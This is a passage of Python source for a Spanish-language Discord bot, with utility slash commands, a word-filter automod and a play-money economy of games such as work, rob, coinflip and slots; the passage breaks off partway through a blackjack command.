@bot.tree.command(name="password", description="Generar contrase√±a segura")
@discord.app_commands.describe(length="Longitud de la contrase√±a (8-50)")
async def password_command(interaction: discord.Interaction, length: int = 12):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    if length < 8 or length > 50:
        await interaction.response.send_message(
            "‚ùå La longitud debe ser entre 8 y 50 caracteres.", ephemeral=True)
        return

    import string
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    password = ''.join(random.choice(chars) for _ in range(length))

    embed = discord.Embed(
        title="üîê Contrase√±a Generada",
        description=f"```{password}```",
        color=discord.Color.green())
    embed.add_field(name="üìè Longitud", value=f"{length} caracteres", inline=True)
    embed.add_field(name="üîí Seguridad", value="Alta", inline=True)
    embed.set_footer(text="‚ö†Ô∏è Guarda esta contrase√±a en un lugar seguro")

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="quote", description="Cita inspiradora aleatoria")
async def quote_command(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    quotes = [
        ("La vida es lo que ocurre mientras est√°s ocupado haciendo otros planes.", "John Lennon"),
        ("El √∫nico modo de hacer un gran trabajo es amar lo que haces.", "Steve Jobs"),
        ("La innovaci√≥n distingue entre un l√≠der y un seguidor.", "Steve Jobs"),
        ("El √©xito es ir de fracaso en fracaso sin perder el entusiasmo.", "Winston Churchill"),
        ("La imaginaci√≥n es m√°s importante que el conocimiento.", "Albert Einstein"),
        ("No puedes conectar los puntos mirando hacia adelante.", "Steve Jobs"),
        ("La √∫nica forma de hacer algo bien es hacerlo con pasi√≥n.", "An√≥nimo"),
        ("El fracaso es simplemente la oportunidad de comenzar de nuevo.", "Henry Ford"),
        ("Tu tiempo es limitado, no lo malgastes viviendo la vida de otro.", "Steve Jobs"),
        ("La diferencia entre lo ordinario y lo extraordinario es ese peque√±o extra.", "Jimmy Johnson")
    ]

    quote_text, author = random.choice(quotes)

    embed = discord.Embed(
        title="üí≠ Cita Inspiradora",
        description=f"*\"{quote_text}\"*",
        color=discord.Color.purple())
    embed.set_footer(text=f"‚Äî {author}")

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="translate", description="Traductor simulado")
@discord.app_commands.describe(text="Texto a traducir", target_lang="Idioma objetivo")
async def translate_command(interaction: discord.Interaction, text: str, target_lang: str):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    # Simulaci√≥n de traducci√≥n
    translations = {
        "english": f"[EN] {text} (translated)",
        "spanish": f"[ES] {text} (traducido)",
        "french": f"[FR] {text} (traduit)",
        "german": f"[DE] {text} (√ºbersetzt)",
        "italian": f"[IT] {text} (tradotto)",
        "portuguese": f"[PT] {text} (traduzido)"
    }

    target = target_lang.lower()
    if target in translations:
        result = translations[target]
    else:
        result = f"[{target_lang.upper()}] {text} (simulated translation)"

    embed = discord.Embed(
        title="üåê Traductor",
        color=discord.Color.blue())
    embed.add_field(name="üìù Original", value=text, inline=False)
    embed.add_field(name="üîÑ Traducido", value=result, inline=False)
    embed.add_field(name="üéØ Idioma", value=target_lang.title(), inline=True)
    embed.set_footer(text="‚ö†Ô∏è Traducci√≥n simulada - No real")

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="joke", description="Contar un chiste aleatorio")
async def joke_command(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    jokes = [
        "¬øPor qu√© los programadores prefieren el modo oscuro? Porque la luz atrae a los bugs! üêõ",
        "¬øC√≥mo se llama un boomerang que no vuelve? Un palo. ü™É",
        "¬øPor qu√© los p√°jaros vuelan hacia el sur en invierno? Porque es muy lejos para caminar. üê¶",
        "¬øQu√© le dice un taco a otro taco? ¬øQuieres que salgamos esta noche? üåÆ",
        "¬øPor qu√© los desarrolladores odian la naturaleza? Tiene demasiados bugs. üåø",
        "¬øQu√© hace una abeja en el gimnasio? ¬°Zum-ba! üêù"
    ]

    joke = random.choice(jokes)

    embed = discord.Embed(
        title="üòÇ Chiste del D√≠a",
        description=joke,
        color=discord.Color.orange())

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="color", description="Generar un color aleatorio")
async def color_command(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    # Generar color aleatorio
    color_int = random.randint(0, 16777215)  # 0xFFFFFF
    hex_color = f"#{color_int:06x}".upper()

    # Valores RGB
    r = (color_int >> 16) & 255
    g = (color_int >> 8) & 255  
    b = color_int & 255

    embed = discord.Embed(
        title="üé® Color Aleatorio",
        color=discord.Color(color_int))

    embed.add_field(name="üî¢ HEX", value=f"`{hex_color}`", inline=True)
    embed.add_field(name="üåà RGB", value=f"`({r}, {g}, {b})`", inline=True)
    embed.add_field(name="üéØ Decimal", value=f"`{color_int}`", inline=True)

    # Cuadrado de color simulado
    embed.add_field(name="üé® Vista Previa", 
                   value="El color se muestra en el borde de este embed", 
                   inline=False)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="base64", description="Codificar/decodificar texto en Base64")
@discord.app_commands.describe(action="encode o decode", text="Texto a procesar")
async def base64_command(interaction: discord.Interaction, action: str, text: str):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    try:
        import base64

        if action.lower() == "encode":
            encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')

            embed = discord.Embed(
                title="üîê Base64 Encoder",
                color=discord.Color.green())
            embed.add_field(name="üìù Original", value=f"```{text}```", inline=False)
            embed.add_field(name="üîí Codificado", value=f"```{encoded}```", inline=False)

        elif action.lower() == "decode":
            try:
                decoded = base64.b64decode(text.encode('utf-8')).decode('utf-8')

                embed = discord.Embed(
                    title="üîì Base64 Decoder",
                    color=discord.Color.blue())
                embed.add_field(name="üîí Codificado", value=f"```{text}```", inline=False)
                embed.add_field(name="üìù Decodificado", value=f"```{decoded}```", inline=False)
            except:
                await interaction.response.send_message(
                    "‚ùå El texto no es v√°lido en Base64.", ephemeral=True)
                return
        else:
            await interaction.response.send_message(
                "‚ùå Acci√≥n debe ser 'encode' o 'decode'.", ephemeral=True)
            return

        await interaction.response.send_message(embed=embed)

    except Exception as e:
        await interaction.response.send_message(
            f"‚ùå Error procesando Base64: {str(e)}", ephemeral=True)


@bot.tree.command(name="uptime", description="Ver tiempo de actividad del bot")
async def uptime_command(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    # Simular tiempo de actividad
    days = random.randint(0, 30)
    hours = random.randint(0, 23)
    minutes = random.randint(0, 59)

    embed = discord.Embed(
        title="‚è±Ô∏è Tiempo de Actividad",
        description=f"**{days}** d√≠as, **{hours}** horas, **{minutes}** minutos",
        color=discord.Color.green())

    embed.add_field(name="üìä Estado", value="üü¢ En l√≠nea", inline=True)
    embed.add_field(name="üåê Servidores", value=f"{len(bot.guilds)}", inline=True)
    embed.add_field(name="üë• Usuarios", value=f"~{len(bot.users)}", inline=True)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="choose", description="Elegir entre opciones")
@discord.app_commands.describe(options="Opciones separadas por comas")
async def choose_command(interaction: discord.Interaction, options: str):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    choices = [choice.strip() for choice in options.split(',') if choice.strip()]

    if len(choices) < 2:
        await interaction.response.send_message(
            "‚ùå Necesitas al menos 2 opciones separadas por comas.", ephemeral=True)
        return

    chosen = random.choice(choices)

    embed = discord.Embed(
        title="üéØ Elecci√≥n Aleatoria",
        description=f"**He elegido:** {chosen}",
        color=discord.Color.gold())

    embed.add_field(name="üìù Opciones", 
                   value="\n".join([f"‚Ä¢ {choice}" for choice in choices]), 
                   inline=False)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="ascii", description="Convertir texto a arte ASCII")
@discord.app_commands.describe(text="Texto a convertir (m√°ximo 10 caracteres)")
async def ascii_command(interaction: discord.Interaction, text: str):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    if len(text) > 10:
        await interaction.response.send_message(
            "‚ùå M√°ximo 10 caracteres.", ephemeral=True)
        return

    # ASCII art simple simulado
    ascii_art = f"""
```
 ‚ñà‚ñà‚ïó  {text.upper()}  ‚ñà‚ñà‚ïó
‚ñà‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ïó
‚ïö‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù
```"""

    embed = discord.Embed(
        title="üé® Arte ASCII",
        description=ascii_art,
        color=discord.Color.blue())
    embed.set_footer(text="‚ö†Ô∏è Arte ASCII simulado")

    await interaction.response.send_message(embed=embed)


# ================================
# COMANDOS DE INFORMACI√ìN Y ESTAD√çSTICAS
# ================================

@bot.tree.command(name="stats", description="Estad√≠sticas del servidor")
async def stats_command(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    guild = interaction.guild
    if not guild:
        await interaction.response.send_message(
            "‚ùå Este comando solo funciona en servidores.", ephemeral=True)
        return

    # Contar tipos de canales
    text_channels = len([c for c in guild.channels if isinstance(c, discord.TextChannel)])
    voice_channels = len([c for c in guild.channels if isinstance(c, discord.VoiceChannel)])
    categories = len([c for c in guild.channels if isinstance(c, discord.CategoryChannel)])

    # Contar miembros online (simulado)
    online_members = random.randint(1, min(50, guild.member_count or 10))

    embed = discord.Embed(
        title=f"üìä Estad√≠sticas de {guild.name}",
        color=discord.Color.blue())

    embed.add_field(name="üë• Miembros", value=guild.member_count or "No disponible", inline=True)
    embed.add_field(name="üü¢ En l√≠nea", value=online_members, inline=True)
    embed.add_field(name="üè∑Ô∏è Roles", value=len(guild.roles), inline=True)

    embed.add_field(name="üìù Canales de texto", value=text_channels, inline=True)
    embed.add_field(name="üîä Canales de voz", value=voice_channels, inline=True)
    embed.add_field(name="üìÅ Categor√≠as", value=categories, inline=True)

    embed.add_field(name="üòÑ Emojis", value=len(guild.emojis), inline=True)
    embed.add_field(name="üéâ Boosts", value=guild.premium_subscription_count or 0, inline=True)
    embed.add_field(name="‚≠ê Nivel boost", value=f"Nivel {guild.premium_tier}", inline=True)

    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="roles", description="Lista todos los roles del servidor")
async def roles_command(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    guild = interaction.guild
    if not guild:
        await interaction.response.send_message(
            "‚ùå Este comando solo funciona en servidores.", ephemeral=True)
        return

    roles = sorted(guild.roles, key=lambda r: r.position, reverse=True)

    embed = discord.Embed(
        title=f"üè∑Ô∏è Roles en {guild.name}",
        description=f"Total: **{len(roles)}** roles",
        color=discord.Color.blue())

    role_list = ""
    for i, role in enumerate(roles[:20]):  # Mostrar m√°ximo 20
        if role.name != "@everyone":
            member_count = len(role.members)
            role_list += f"**{role.name}** - {member_count} miembro{'s' if member_count != 1 else ''}\n"

    if role_list:
        embed.add_field(name="üìã Lista de Roles", value=role_list, inline=False)

    if len(roles) > 20:
        embed.set_footer(text=f"Mostrando 20 de {len(roles)} roles")

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="channels", description="Lista todos los canales del servidor")
async def channels_command(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    guild = interaction.guild
    if not guild:
        await interaction.response.send_message(
            "‚ùå Este comando solo funciona en servidores.", ephemeral=True)
        return

    text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
    voice_channels = [c for c in guild.channels if isinstance(c, discord.VoiceChannel)]

    embed = discord.Embed(
        title=f"üìã Canales en {guild.name}",
        color=discord.Color.blue())

    if text_channels:
        text_list = "\n".join([f"üìù {c.name}" for c in text_channels[:15]])
        embed.add_field(name="üí¨ Canales de Texto", value=text_list, inline=False)

    if voice_channels:
        voice_list = "\n".join([f"üîä {c.name}" for c in voice_channels[:15]])
        embed.add_field(name="üé§ Canales de Voz", value=voice_list, inline=False)

    total_channels = len(guild.channels)
    if total_channels > 30:
        embed.set_footer(text=f"Mostrando algunos de {total_channels} canales totales")

    await interaction.response.send_message(embed=embed)


# ================================
# MODIFICAR EVENT ON_MESSAGE PARA INTEGRAR SISTEMAS
# ================================


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    guild_id = message.guild.id if message.guild else None

    # Sistema de automod
    if guild_id and automod_enabled.get(guild_id, False):
        # Filtro de palabras
        content_lower = message.content.lower()
        if any(word in content_lower for word in banned_words):
            try:
                await message.delete()

                # A√±adir advertencia
                user_id = message.author.id
                if user_id not in warning_counts:
                    warning_counts[user_id] = 0
                warning_counts[user_id] += 1

                warnings = warning_counts[user_id]
                threshold = automod_settings[guild_id]['warn_threshold']

                embed = discord.Embed(
                    title="üö´ Mensaje Eliminado",
                    description=
                    f"{message.author.mention} tu mensaje conten√≠a palabras prohibidas.",
                    color=discord.Color.red())
                embed.add_field(name="‚ö†Ô∏è Advertencias",
                                value=f"{warnings}/{threshold}",
                                inline=True)

                if warnings >= threshold:
                    try:
                        await message.author.timeout(
                            datetime.timedelta(minutes=10),
                            reason="Demasiadas advertencias")
                        embed.add_field(name="üîá Castigo",
                                        value="Silenciado por 10 minutos",
                                        inline=True)
                        warning_counts[user_id] = 0
                    except:
                        pass

                await message.channel.send(embed=embed, delete_after=10)
            except:
                pass

    # Sistema de niveles (XP por mensaje)
    if guild_id:
        await process_level_system(message)

    # CR√çTICO: Procesar comandos de econom√≠a y otros
    await bot.process_commands(message)


# ================================
# COMANDOS DE ECONOM√çA CON PREFIJO .
# ================================

@bot.command(name='balance')
async def balance_command(ctx):
    """Ver tu balance de dinero"""
    user_data = get_balance(ctx.author.id)
    total = user_data['wallet'] + user_data['bank']
    
    embed = discord.Embed(title="üí∞ Tu Balance", color=discord.Color.green())
    embed.add_field(name="üëõ Billetera", value=f"${user_data['wallet']:,}", inline=True)
    embed.add_field(name="üè¶ Banco", value=f"${user_data['bank']:,}", inline=True)
    embed.add_field(name="üíé Total", value=f"${total:,}", inline=True)
    embed.set_footer(text=f"Balance de {ctx.author.display_name}")
    
    await ctx.send(embed=embed)

@bot.command(name='work')
async def work_command(ctx):
    """Trabajar para ganar dinero"""
    if not can_use_cooldown(ctx.author.id, 'work', 3600):  # 1 hora
        remaining = get_cooldown_remaining(ctx.author.id, 'work', 3600)
        minutes = int(remaining // 60)
        seconds = int(remaining % 60)
        await ctx.send(f"‚è∞ Debes esperar **{minutes}m {seconds}s** antes de trabajar de nuevo.")
        return
    
    jobs = [
        ("üë®‚Äçüíª Programador", 500, 1200),
        ("üè™ Cajero", 300, 800),
        ("üöö Conductor", 400, 900),
        ("üë®‚Äçüç≥ Chef", 350, 750),
        ("üìö Bibliotecario", 250, 600),
        ("üßπ Conserje", 200, 500),
        ("üì¶ Repartidor", 300, 700)
    ]
    
    job_name, min_pay, max_pay = random.choice(jobs)
    earnings = random.randint(min_pay, max_pay)
    
    update_balance(ctx.author.id, earnings, 0)
    
    embed = discord.Embed(title="üíº Trabajo Completado", color=discord.Color.green())
    embed.add_field(name="üë∑ Trabajo", value=job_name, inline=True)
    embed.add_field(name="üí∞ Ganaste", value=f"${earnings:,}", inline=True)
    embed.set_footer(text="¬°Buen trabajo! Vuelve en 1 hora.")
    
    await ctx.send(embed=embed)

@bot.command(name='daily')
async def daily_command(ctx):
    """Recompensa diaria"""
    if not can_use_cooldown(ctx.author.id, 'daily', 86400):  # 24 horas
        remaining = get_cooldown_remaining(ctx.author.id, 'daily', 86400)
        hours = int(remaining // 3600)
        minutes = int((remaining % 3600) // 60)
        await ctx.send(f"‚è∞ Ya recogiste tu recompensa diaria. Vuelve en **{hours}h {minutes}m**.")
        return
    
    daily_amount = random.randint(800, 1500)
    update_balance(ctx.author.id, daily_amount, 0)
    
    embed = discord.Embed(title="üéÅ Recompensa Diaria", color=discord.Color.gold())
    embed.add_field(name="üí∞ Ganaste", value=f"${daily_amount:,}", inline=True)
    embed.add_field(name="‚è∞ Pr√≥xima", value="En 24 horas", inline=True)
    embed.set_footer(text="¬°Vuelve ma√±ana para m√°s!")
    
    await ctx.send(embed=embed)

@bot.command(name='pay')
async def pay_command(ctx, member: discord.Member = None, amount: int = None):
    """Enviar dinero a otro usuario"""
    if not member or not amount:
        await ctx.send("‚ùå Uso: `.pay @usuario cantidad`")
        return
    
    if member.bot:
        await ctx.send("‚ùå No puedes enviar dinero a un bot.")
        return
    
    if member.id == ctx.author.id:
        await ctx.send("‚ùå No puedes enviarte dinero a ti mismo.")
        return
    
    if amount <= 0:
        await ctx.send("‚ùå La cantidad debe ser mayor a 0.")
        return
    
    sender_balance = get_balance(ctx.author.id)
    if sender_balance['wallet'] < amount:
        await ctx.send(f"‚ùå No tienes suficiente dinero. Tienes ${sender_balance['wallet']:,}")
        return
    
    # Transferir dinero
    update_balance(ctx.author.id, -amount, 0)
    update_balance(member.id, amount, 0)
    
    embed = discord.Embed(title="üí∏ Transferencia Exitosa", color=discord.Color.green())
    embed.add_field(name="üë§ Enviaste", value=f"${amount:,} a {member.mention}", inline=False)
    embed.set_footer(text="¬°Transferencia completada!")
    
    await ctx.send(embed=embed)

@bot.command(name='deposit')
async def deposit_command(ctx, amount=None):
    """Depositar dinero en el banco"""
    if not amount:
        await ctx.send("‚ùå Uso: `.deposit cantidad` o `.deposit all`")
        return
    
    user_balance = get_balance(ctx.author.id)
    
    if amount.lower() == 'all':
        amount = user_balance['wallet']
    else:
        try:
            amount = int(amount)
        except ValueError:
            await ctx.send("‚ùå Cantidad inv√°lida.")
            return
    
    if amount <= 0:
        await ctx.send("‚ùå La cantidad debe ser mayor a 0.")
        return
    
    if user_balance['wallet'] < amount:
        await ctx.send(f"‚ùå No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}")
        return
    
    update_balance(ctx.author.id, -amount, amount)
    
    embed = discord.Embed(title="üè¶ Dep√≥sito Exitoso", color=discord.Color.blue())
    embed.add_field(name="üí∞ Depositaste", value=f"${amount:,}", inline=True)
    embed.add_field(name="üè¶ Nuevo balance bancario", value=f"${user_balance['bank'] + amount:,}", inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name='withdraw')
async def withdraw_command(ctx, amount=None):
    """Retirar dinero del banco"""
    if not amount:
        await ctx.send("‚ùå Uso: `.withdraw cantidad` o `.withdraw all`")
        return
    
    user_balance = get_balance(ctx.author.id)
    
    if amount.lower() == 'all':
        amount = user_balance['bank']
    else:
        try:
            amount = int(amount)
        except ValueError:
            await ctx.send("‚ùå Cantidad inv√°lida.")
            return
    
    if amount <= 0:
        await ctx.send("‚ùå La cantidad debe ser mayor a 0.")
        return
    
    if user_balance['bank'] < amount:
        await ctx.send(f"‚ùå No tienes suficiente dinero en el banco. Tienes ${user_balance['bank']:,}")
        return
    
    update_balance(ctx.author.id, amount, -amount)
    
    embed = discord.Embed(title="üè¶ Retiro Exitoso", color=discord.Color.blue())
    embed.add_field(name="üí∞ Retiraste", value=f"${amount:,}", inline=True)
    embed.add_field(name="üëõ Nuevo balance de billetera", value=f"${user_balance['wallet'] + amount:,}", inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name='beg')
async def beg_command(ctx):
    """Mendigar por dinero"""
    if not can_use_cooldown(ctx.author.id, 'beg', 300):  # 5 minutos
        remaining = get_cooldown_remaining(ctx.author.id, 'beg', 300)
        minutes = int(remaining // 60)
        seconds = int(remaining % 60)
        await ctx.send(f"‚è∞ Debes esperar **{minutes}m {seconds}s** antes de mendigar de nuevo.")
        return
    
    success_chance = random.random()
    
    if success_chance > 0.3:  # 70% de √©xito
        amount = random.randint(50, 200)
        update_balance(ctx.author.id, amount, 0)
        
        messages = [
            f"ü™ô Un extra√±o te dio ${amount}!",
            f"üíù Alguien se compadeci√≥ de ti y te dio ${amount}!",
            f"üôè Una persona bondadosa te don√≥ ${amount}!",
            f"‚ú® Encontraste ${amount} en el suelo!"
        ]
        
        await ctx.send(random.choice(messages))
    else:
        messages = [
            "üòî Nadie te dio dinero esta vez...",
            "üö´ La gente te ignor√≥.",
            "üòÖ No tuviste suerte esta vez."
        ]
        
        await ctx.send(random.choice(messages))

@bot.command(name='crime')
async def crime_command(ctx):
    """Cometer cr√≠menes por dinero (riesgoso)"""
    if not can_use_cooldown(ctx.author.id, 'crime', 1800):  # 30 minutos
        remaining = get_cooldown_remaining(ctx.author.id, 'crime', 1800)
        minutes = int(remaining // 60)
        seconds = int(remaining % 60)
        await ctx.send(f"‚è∞ Debes esperar **{minutes}m {seconds}s** antes de cometer otro crimen.")
        return
    
    crimes = [
        ("üè™ Robar una tienda", 200, 800),
        ("üöó Robar un auto", 500, 1200),
        ("üíª Hackear un banco", 800, 2000),
        ("üíé Robar joyer√≠a", 600, 1500),
        ("üèõÔ∏è Robar un museo", 1000, 2500)
    ]
    
    crime_name, min_reward, max_reward = random.choice(crimes)
    success_chance = random.random()
    
    if success_chance > 0.4:  # 60% de √©xito
        reward = random.randint(min_reward, max_reward)
        update_balance(ctx.author.id, reward, 0)
        
        embed = discord.Embed(title="üé≠ Crimen Exitoso", color=discord.Color.green())
        embed.add_field(name="üî´ Crimen", value=crime_name, inline=True)
        embed.add_field(name="üí∞ Ganaste", value=f"${reward:,}", inline=True)
        embed.set_footer(text="¬°Escapaste sin ser atrapado!")
        
        await ctx.send(embed=embed)
    else:
        fine = random.randint(100, 500)
        user_balance = get_balance(ctx.author.id)
        
        if user_balance['wallet'] >= fine:
            update_balance(ctx.author.id, -fine, 0)
            
        embed = discord.Embed(title="üöî Te Atraparon", color=discord.Color.red())
        embed.add_field(name="üî´ Crimen", value=crime_name, inline=True)
        embed.add_field(name="üí∏ Multa", value=f"${fine:,}", inline=True)
        embed.set_footer(text="¬°La polic√≠a te atrap√≥!")
        
        await ctx.send(embed=embed)

@bot.command(name='rob')
async def rob_command(ctx, member: discord.Member = None):
    """Intentar robar a otro usuario"""
    if not member:
        await ctx.send("‚ùå Uso: `.rob @usuario`")
        return
    
    if member.bot:
        await ctx.send("‚ùå No puedes robar a un bot.")
        return
    
    if member.id == ctx.author.id:
        await ctx.send("‚ùå No puedes robarte a ti mismo.")
        return
    
    if not can_use_cooldown(ctx.author.id, 'rob', 3600):  # 1 hora
        remaining = get_cooldown_remaining(ctx.author.id, 'rob', 3600)
        minutes = int(remaining // 60)
        await ctx.send(f"‚è∞ Debes esperar **{minutes}m** antes de robar de nuevo.")
        return
    
    target_balance = get_balance(member.id)
    if target_balance['wallet'] < 500:
        await ctx.send(f"‚ùå {member.mention} no tiene suficiente dinero para robar (m√≠nimo $500).")
        return
    
    success_chance = random.random()
    
    if success_chance > 0.5:  # 50% de √©xito
        stolen_amount = random.randint(100, min(target_balance['wallet'] // 3, 1000))
        
        update_balance(member.id, -stolen_amount, 0)
        update_balance(ctx.author.id, stolen_amount, 0)
        
        embed = discord.Embed(title="üí∞ Robo Exitoso", color=discord.Color.green())
        embed.add_field(name="üéØ V√≠ctima", value=member.mention, inline=True)
        embed.add_field(name="üí∏ Robaste", value=f"${stolen_amount:,}", inline=True)
        embed.set_footer(text="¬°Escapaste con el dinero!")
        
        await ctx.send(embed=embed)
    else:
        fine = random.randint(200, 600)
        user_balance = get_balance(ctx.author.id)
        
        if user_balance['wallet'] >= fine:
            update_balance(ctx.author.id, -fine, 0)
        
        embed = discord.Embed(title="üö´ Robo Fallido", color=discord.Color.red())
        embed.add_field(name="üéØ Objetivo", value=member.mention, inline=True)
        embed.add_field(name="üí∏ Multa", value=f"${fine:,}", inline=True)
        embed.set_footer(text="¬°Te atraparon intentando robar!")
        
        await ctx.send(embed=embed)

@bot.command(name='coinflip')
async def coinflip_command(ctx, choice=None, amount: int = None):
    """Apostar en cara o cruz"""
    if not choice or not amount:
        await ctx.send("‚ùå Uso: `.coinflip cara/cruz cantidad`")
        return
    
    if choice.lower() not in ['cara', 'cruz', 'heads', 'tails']:
        await ctx.send("‚ùå Elige 'cara' o 'cruz'.")
        return
    
    if amount <= 0:
        await ctx.send("‚ùå La cantidad debe ser mayor a 0.")
        return
    
    user_balance = get_balance(ctx.author.id)
    if user_balance['wallet'] < amount:
        await ctx.send(f"‚ùå No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}")
        return
    
    # Normalizar elecci√≥n
    user_choice = 'cara' if choice.lower() in ['cara', 'heads'] else 'cruz'
    
    # Lanzar moneda
    result = random.choice(['cara', 'cruz'])
    
    if user_choice == result:
        # Gan√≥
        winnings = amount
        update_balance(ctx.author.id, winnings, 0)
        
        embed = discord.Embed(title="ü™ô Coinflip - ¬°GANASTE!", color=discord.Color.green())
        embed.add_field(name="üéØ Tu elecci√≥n", value=user_choice.title(), inline=True)
        embed.add_field(name="üé∞ Resultado", value=f"ü™ô {result.title()}", inline=True)
        embed.add_field(name="üí∞ Ganaste", value=f"${winnings:,}", inline=True)
    else:
        # Perdi√≥
        update_balance(ctx.author.id, -amount, 0)
        
        embed = discord.Embed(title="ü™ô Coinflip - Perdiste", color=discord.Color.red())
        embed.add_field(name="üéØ Tu elecci√≥n", value=user_choice.title(), inline=True)
        embed.add_field(name="üé∞ Resultado", value=f"ü™ô {result.title()}", inline=True)
        embed.add_field(name="üí∏ Perdiste", value=f"${amount:,}", inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name='slots')
async def slots_command(ctx, amount: int = None):
    """Jugar a la m√°quina tragamonedas"""
    if not amount:
        await ctx.send("‚ùå Uso: `.slots cantidad`")
        return
    
    if amount <= 0:
        await ctx.send("‚ùå La cantidad debe ser mayor a 0.")
        return
    
    user_balance = get_balance(ctx.author.id)
    if user_balance['wallet'] < amount:
        await ctx.send(f"‚ùå No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}")
        return
    
    # S√≠mbolos de la m√°quina
    symbols = ['üçí', 'üçã', 'üçä', 'üçá', '‚≠ê', 'üíé', '7Ô∏è‚É£']
    weights = [30, 25, 20, 15, 5, 3, 2]  # Probabilidades
    
    # Girar slots
    result = [random.choices(symbols, weights=weights)[0] for _ in range(3)]
    
    # Determinar premio
    if result[0] == result[1] == result[2]:
        # Tres iguales
        if result[0] == 'üíé':
            multiplier = 10
        elif result[0] == '7Ô∏è‚É£':
            multiplier = 8
        elif result[0] == '‚≠ê':
            multiplier = 5
        else:
            multiplier = 3
        
        winnings = amount * multiplier
        update_balance(ctx.author.id, winnings - amount, 0)  # -amount porque ya se rest√≥ la apuesta
        
        embed = discord.Embed(title="üé∞ Slots - ¬°JACKPOT!", color=discord.Color.gold())
        embed.add_field(name="üéØ Resultado", value=" ".join(result), inline=False)
        embed.add_field(name="üí∞ Ganaste", value=f"${winnings:,} (x{multiplier})", inline=True)
        
    elif result[0] == result[1] or result[1] == result[2] or result[0] == result[2]:
        # Dos iguales
        winnings = amount
        # No se actualiza balance (empate)
        
        embed = discord.Embed(title="üé∞ Slots - ¬°Empate!", color=discord.Color.orange())
        embed.add_field(name="üéØ Resultado", value=" ".join(result), inline=False)
        embed.add_field(name="üí´ Resultado", value="¬°Recuperaste tu apuesta!", inline=True)
        
    else:
        # Perdi√≥
        update_balance(ctx.author.id, -amount, 0)
        
        embed = discord.Embed(title="üé∞ Slots - Perdiste", color=discord.Color.red())
        embed.add_field(name="üéØ Resultado", value=" ".join(result), inline=False)
        embed.add_field(name="üí∏ Perdiste", value=f"${amount:,}", inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name='blackjack')
async def blackjack_command(ctx, amount: int = None):
    """Jugar al blackjack"""
    if not amount:
        await ctx.send("‚ùå Uso: `.blackjack cantidad`")
        return
    
    if amount <= 0:
        await ctx.send("‚ùå La cantidad debe ser mayor a 0.")
        return
    
    user_balance = get_balance(ctx.author.id)
    if user_balance['wallet'] < amount:
        await ctx.send(f"‚ùå No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}")
        return
    
    # Cartas simples (valores)
    cards = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K']
    
    def card_value(card):
        if card in ['J', 'Q', 'K']:
            return 10
        elif card == 'A':
            return 11  # Se ajustar√° despu√©s si es necesario
        else:
            return int(card)
    
    def calculate_hand(hand):
        total = sum(card_value(card) for card in hand)
        aces = hand.count('A')
        
        # Ajustar ases si es necesario
        while total > 21 and aces > 0:
            total -= 10
            aces -= 1
        
        return total
    
    # Repartir cartas iniciales
    player_hand = [random.choice(cards), random.choice(cards)]
    dealer_hand = [random.choice(cards)]  # Dealer solo muestra una carta inicialmente
    
    player_total = calculate_hand(player_hand)
    
    embed = discord.Embed(title="üÉè Blackjack", color=discord.Color.blue())
